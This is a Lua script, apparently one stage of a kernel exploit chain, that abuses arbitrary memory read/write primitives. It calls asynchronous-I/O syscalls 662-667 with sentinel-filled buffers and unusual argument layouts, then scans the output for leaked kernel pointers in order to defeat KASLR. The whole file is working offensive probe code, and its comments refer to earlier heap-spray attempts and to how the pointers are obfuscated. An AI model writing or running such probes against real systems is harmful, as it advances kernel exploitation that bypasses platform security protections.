-- CRASH_CLASS: MODERATE
-- PROBE 73a: Deep AIO output forensics — byte-level scan of ALL readback syscalls
--
-- Zone isolation (doc 14) confirms cross-subsystem spray is dead.
-- The ONLY KASLR path through AIO is finding a readback interface that
-- exposes raw object bytes (kernel pointers) rather than computed status.
--
-- I+0x10 contains obfuscated kernel pointer: (val >> 4) ^ val
-- If ANY output interface writes >4 bytes, the extra bytes may be kernel-derived.
--
-- Tests: 662 (delete), 663 (wait), 664 (poll), 666 (query), 667 (unknown)
-- Each with sentinel-filled buffers, byte-level scan for ANY modification.

print("=== PROBE 73a: AIO OUTPUT FORENSICS ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local pid = N(mk(20)())
print("pid=" .. pid)

local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do wb(N(p) + i - 1, string.byte(s, i)) end
    wb(N(p) + #s, 0)
    return p
end

local fd_zero = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("zero_fd=" .. fd_zero)
if fd_zero < 0 then print("ERROR: no /dev/zero"); return end

local data_buf = memory.alloc(0x100)
local sc669 = mk(669)
local sc662 = mk(662)
local sc663 = mk(663)
local sc664 = mk(664)
local sc666 = mk(666)
local sc667 = mk(667)

local function aio_submit_one()
    local req = memory.alloc(0x30)
    local ids = memory.alloc(8)
    wq(N(req) + 0x00, uint64(0))
    wq(N(req) + 0x08, uint64(64))
    wq(N(req) + 0x10, data_buf)
    wq(N(req) + 0x18, uint64(0))
    wq(N(req) + 0x20, uint64(fd_zero))
    local ret = N(sc669(uint64(1), req, uint64(1), uint64(1), ids))
    local id = rd(N(ids))
    if id and id < 0 then id = id + 0x100000000 end
    return id, ret
end

local function aio_poll(id)
    pcall(function() sc664(uint64(id or 0)) end)
end

local function fill_sentinel(buf, size)
    for i = 0, size - 1 do
        wb(N(buf) + i, 0xCC)
    end
end

local function scan_buffer(buf, size)
    local mods = {}
    for i = 0, size - 1 do
        local b = rb(N(buf) + i)
        if b and b ~= 0xCC then
            mods[#mods + 1] = {off = i, val = b}
        end
    end
    return mods
end

local function print_mods(mods, label)
    if #mods == 0 then
        print("    " .. label .. ": 0 bytes modified")
    else
        print(string.format("    %s: %d bytes modified:", label, #mods))
        local line = "      "
        for i, m in ipairs(mods) do
            line = line .. string.format("+%02X=%02X ", m.off, m.val)
            if i % 8 == 0 then print(line); line = "      " end
        end
        if #line > 6 then print(line) end

        -- Check for kernel pointers in qword-aligned modified data
        for i = 0, #mods - 1, 8 do
            if mods[i+1] and mods[i+8] then
                local off = mods[i+1].off
                if off % 8 == 0 then
                    local q = rq(N(buf) + off)
                    if q then
                        local h, l = get_hi_lo(q)
                        if h >= 0xFFFF8000 then
                            print(string.format("    *** KERNEL POINTER at +%02X: %s ***", off, fmt(q)))
                        end
                    end
                end
            end
        end
    end
end

-- Submit and poll 8 AIO requests
print("")
print("[A] Submitting 8 AIO requests")
local ids = {}
for i = 1, 8 do
    local id, ret = aio_submit_one()
    if id and id > 0 then
        aio_poll(id)
        ids[#ids + 1] = id
    end
end
print("  submitted+polled: " .. #ids)
if #ids < 4 then print("ERROR: too few IDs"); return end
for i = 1, math.min(4, #ids) do
    print(string.format("  id[%d] = 0x%X", i, ids[i]))
end

-- Test each syscall with large sentinel buffer
print("")
print("[B] 666 (query) output scan — per ID, 256-byte buffer")
for i = 1, math.min(4, #ids) do
    local buf = memory.alloc(0x100)
    fill_sentinel(buf, 256)
    local ok, ret = pcall(function() return sc666(uint64(ids[i]), uint64(1), buf, uint64(0), uint64(0), uint64(0)) end)
    local mods = scan_buffer(buf, 256)
    print(string.format("  id=0x%X ret=%s", ids[i], ok and tostring(N(ret)) or "PCALL_FAIL"))
    print_mods(mods, "666")
end

print("")
print("[C] 666 multi-ID (count=4) output scan — 512-byte buffer")
do
    local id_arr = memory.alloc(32)
    for i = 1, 4 do wd(N(id_arr) + (i-1)*4, ids[i]) end
    local buf = memory.alloc(0x200)
    fill_sentinel(buf, 512)
    local ok, ret = pcall(function() return sc666(id_arr, uint64(4), buf, uint64(0), uint64(0), uint64(0)) end)
    local mods = scan_buffer(buf, 512)
    print(string.format("  ret=%s", ok and tostring(N(ret)) or "PCALL_FAIL"))
    print_mods(mods, "666×4")

    -- Analyze stride
    if #mods >= 2 then
        local first_off = mods[1].off
        local second_start = nil
        for j = 2, #mods do
            if mods[j].off > first_off + 3 then
                second_start = mods[j].off
                break
            end
        end
        if second_start then
            print(string.format("    stride estimate: %d bytes per ID", second_start - first_off))
        end
    end
end

print("")
print("[D] 663 (wait) output scan — per ID, 256-byte buffer")
for i = 1, math.min(2, #ids) do
    local buf = memory.alloc(0x100)
    fill_sentinel(buf, 256)
    local ok, ret = pcall(function() return sc663(uint64(ids[i]), uint64(1), buf, uint64(0), uint64(0), uint64(0)) end)
    local mods = scan_buffer(buf, 256)
    print(string.format("  id=0x%X ret=%s", ids[i], ok and tostring(N(ret)) or "PCALL_FAIL"))
    print_mods(mods, "663")
end

print("")
print("[E] 664 (poll) output scan — test with extra buffer arg")
do
    local buf = memory.alloc(0x100)
    fill_sentinel(buf, 256)
    -- 664 normally takes just (id). Try with extra args as output buffers
    local ok, ret = pcall(function() return sc664(uint64(ids[3]), buf, uint64(256), uint64(0), uint64(0), uint64(0)) end)
    local mods = scan_buffer(buf, 256)
    print(string.format("  ret=%s", ok and tostring(N(ret)) or "PCALL_FAIL"))
    print_mods(mods, "664+buf")
end

print("")
print("[F] 667 (unknown) output scan — with real AIO IDs")
for i = 1, math.min(2, #ids) do
    local buf = memory.alloc(0x100)
    fill_sentinel(buf, 256)
    local ok, ret = pcall(function() return sc667(uint64(ids[i]), uint64(1), buf, uint64(0), uint64(0), uint64(0)) end)
    local mods = scan_buffer(buf, 256)
    print(string.format("  id=0x%X ret=%s", ids[i], ok and tostring(N(ret)) or "PCALL_FAIL"))
    print_mods(mods, "667")
    if not ok then
        print("    667 PCALL FAILED — may have killed, checking alive")
        local alive_ok = pcall(function() mk(20)() end)
        if not alive_ok then print("    DEAD"); break end
    end
end

print("")
print("[G] 667 alternative arg layouts (if still alive)")
do
    local alive = pcall(function() mk(20)() end)
    if alive then
        local layouts = {
            {"667(id,buf,1,0,0,0)", function(id,buf) return sc667(uint64(id), buf, uint64(1), uint64(0), uint64(0), uint64(0)) end},
            {"667(buf,id,1,0,0,0)", function(id,buf) return sc667(buf, uint64(id), uint64(1), uint64(0), uint64(0), uint64(0)) end},
            {"667(id,0,buf,0,0,0)", function(id,buf) return sc667(uint64(id), uint64(0), buf, uint64(0), uint64(0), uint64(0)) end},
        }
        for _, lay in ipairs(layouts) do
            local buf = memory.alloc(0x100)
            fill_sentinel(buf, 256)
            local ok, ret = pcall(function() return lay[2](ids[4], buf) end)
            local mods = scan_buffer(buf, 256)
            print(string.format("  %s: ret=%s mod=%d", lay[1], ok and tostring(N(ret)) or "FAIL", #mods))
            if #mods > 0 then print_mods(mods, "  ") end
            if not ok then
                local a2 = pcall(function() mk(20)() end)
                if not a2 then print("  DEAD after " .. lay[1]); break end
            end
        end
    else
        print("  DEAD from section [F]")
    end
end

print("")
print("[H] 662 (delete) output scan — varied buffer sizes")
-- Use remaining IDs for 662 tests
local del_idx = 5
for _, sz in ipairs({4, 8, 16, 32, 64, 128, 256}) do
    if del_idx > #ids then break end
    local buf = memory.alloc(sz + 64)  -- extra space to detect overcopy
    fill_sentinel(buf, sz + 64)
    local id_buf = memory.alloc(4)
    wd(N(id_buf), ids[del_idx])
    local ok, ret = pcall(function() return sc662(id_buf, uint64(1), buf, uint64(0), uint64(0), uint64(0)) end)
    local mods = scan_buffer(buf, sz + 64)
    local overcopy = 0
    for _, m in ipairs(mods) do
        if m.off >= sz then overcopy = overcopy + 1 end
    end
    print(string.format("  sz=%3d id=0x%X ret=%s mod=%d overcopy=%d",
        sz, ids[del_idx], ok and tostring(N(ret)) or "FAIL", #mods, overcopy))
    if #mods > 0 then
        local line = "    "
        for j, m in ipairs(mods) do
            line = line .. string.format("+%02X=%02X ", m.off, m.val)
        end
        print(line)
    end
    del_idx = del_idx + 1
end

-- Check for kernel pointers in full qword reads of modified areas
print("")
print("[I] Qword scan of all modified areas")
-- Re-submit fresh IDs for qword scan
local fresh_ids = {}
for i = 1, 4 do
    local id, ret = aio_submit_one()
    if id and id > 0 then
        aio_poll(id)
        fresh_ids[#fresh_ids + 1] = id
    end
end
if #fresh_ids >= 2 then
    local big_buf = memory.alloc(0x200)
    fill_sentinel(big_buf, 512)
    local id_arr = memory.alloc(16)
    for i = 1, math.min(4, #fresh_ids) do
        wd(N(id_arr) + (i-1)*4, fresh_ids[i])
    end
    pcall(function() sc666(id_arr, uint64(#fresh_ids), big_buf, uint64(0), uint64(0), uint64(0)) end)

    -- Read every qword in the buffer
    print("  666 qword dump (first 128 bytes):")
    for off = 0, 120, 8 do
        local q = rq(N(big_buf) + off)
        if q then
            local h, l = get_hi_lo(q)
            local marker = ""
            if h >= 0xFFFF8000 then marker = " *** KERNEL ***" end
            if h ~= 0xCCCCCCCC or l ~= 0xCCCCCCCC then
                print(string.format("    +%02X: %s%s", off, fmt(q), marker))
            end
        end
    end
end

-- Cleanup remaining IDs
print("")
print("[J] Cleanup")
for _, id in ipairs(fresh_ids) do
    local db = memory.alloc(4)
    local ib = memory.alloc(4)
    wd(N(ib), id)
    pcall(function() sc662(ib, uint64(1), db, uint64(0), uint64(0), uint64(0)) end)
end

print("")
print("alive=YES")
print("=== PROBE 73a COMPLETE ===")
